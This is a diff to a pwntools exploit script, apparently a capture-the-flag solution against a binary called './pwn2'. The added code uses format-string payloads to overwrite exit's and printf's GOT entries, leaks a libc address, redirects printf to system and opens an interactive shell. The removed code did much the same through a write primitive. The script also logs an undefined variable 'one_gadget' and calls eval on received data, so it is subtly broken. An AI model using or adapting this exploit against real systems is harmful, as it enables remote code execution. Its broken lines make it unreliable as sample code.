@@ -4,9 +4,9 @@
 
 from pwn import *
 
-local_file  = './write'
-local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '../libc.so.6'
+local_file  = './pwn2'
+local_libc  = '/lib/i386-linux-gnu/libc.so.6'
+remote_libc = local_libc # '../libc.so.6'
 
 is_local = False
 is_remote = False
@@ -27,7 +27,7 @@ elif len(sys.argv) > 1:
 
 elf = ELF(local_file)
 
-context.log_level = 'debug'
+# context.log_level = 'debug'
 context.arch = elf.arch
 
 se      = lambda data               :p.send(data) 
@@ -46,37 +46,25 @@ def debug(cmd=''):
 
 # info
 # gadget
-prdi = 0x00000000000009e3 # pop rdi ; ret
-
 # elf, libc
+main = 0x080485eb
 
-ru('puts: ')
-puts = eval(rc(14))
-ru('stack: ')
-stack = eval(rc(14))
-
-libcbase = puts - libc.sym['puts']
+# fmt1 exit->main, leak
+fmt = fmtstr_payload(7,{elf.got['exit']:main},write_size='byte')
+fmt+= 'AAAA%27$p'
+sla('input: ',fmt)
+ru('AAAA')
+# leak
+libc_start_main_241 = eval(rc(10))
+info_addr('libc_start_main_241',libc_start_main_241)
+libcbase = libc_start_main_241-241-libc.sym['__libc_start_main']
 info_addr('libcbase',libcbase)
-
-ptr = libcbase+0x619f60 #0x239f68
-info_addr('ptr',ptr)
 system = libcbase+libc.sym['system']
-info_addr('system',system)
-rdi = libcbase+0x619968 #0x239968
-info_addr('rdi',rdi)
-
-sl('w')
-sl(str(ptr))
-sl(str(system))
-
-sl('w')
-sl(str(rdi))
-sl(str(u64('/bin/sh\0')))
-
-debug('b *$rebase(0x969)')
-sl('q')
-
-# info_addr('tag',addr)
-# log.warning('--------------')
+info_addr('one_gadget',one_gadget)
+# fmt2 printf->system
+fmt2 = fmtstr_payload(7,{elf.got['printf']:system},write_size='short')
+# debug()
+sla('input: ',fmt2)
+sl('/bin/sh\0')
 
 p.interactive()
